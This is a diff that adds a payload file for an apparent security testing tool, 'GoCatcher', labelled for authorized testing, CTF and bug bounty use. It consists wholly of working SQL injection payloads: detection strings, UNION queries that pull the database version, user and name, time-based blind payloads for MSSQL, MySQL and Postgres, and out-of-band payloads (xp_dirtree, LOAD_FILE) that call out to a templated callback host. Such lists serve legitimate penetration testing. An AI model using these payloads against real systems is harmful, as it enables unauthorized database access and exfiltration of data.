@@ -1,0 +1,21 @@
+===========================================================================
+ GoCatcher :: SQL Injection test payloads  (text/plain)
+ FOR AUTHORIZED TESTING / CTF / BUG BOUNTY ONLY.
+===========================================================================
+
+# Detection:
+'   "   `   ')   ''   1' OR '1'='1   1) OR (1=1   admin'--
+
+# Boolean / UNION:
+' OR 1=1-- -
+' UNION SELECT NULL,NULL,NULL-- -
+' UNION SELECT @@version,current_user,database()-- -
+
+# Time-based (blind):
+'; WAITFOR DELAY '0:0:5'--            (MSSQL)
+' OR SLEEP(5)-- -                     (MySQL)
+' OR pg_sleep(5)--                    (Postgres)
+
+# OOB exfiltration to GoCatcher (DNS/HTTP):
+'; EXEC master..xp_dirtree '//{{callback_url}}/sqli';--           (MSSQL)
+' UNION SELECT LOAD_FILE(CONCAT('\\\\{{callback_url}}\\sqli'))-- - (MySQL)
